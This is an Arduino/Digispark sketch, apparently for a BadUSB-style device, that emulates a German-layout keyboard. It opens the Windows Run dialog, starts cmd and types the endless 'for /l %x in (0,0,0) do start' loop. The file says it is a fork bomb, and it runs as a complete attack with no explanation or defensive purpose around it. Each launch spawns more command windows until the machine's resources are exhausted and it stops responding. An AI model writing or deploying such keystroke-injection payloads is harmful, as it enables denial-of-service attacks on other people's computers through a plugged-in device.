// Simple Windows command prompt fork bomb
// Works with German keyboard layout
#include "./GermanKeyboard.h"
void setup() {
}

void loop() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  pn("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  pn("for /l %x in (0,0,0) do start");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
  }
}
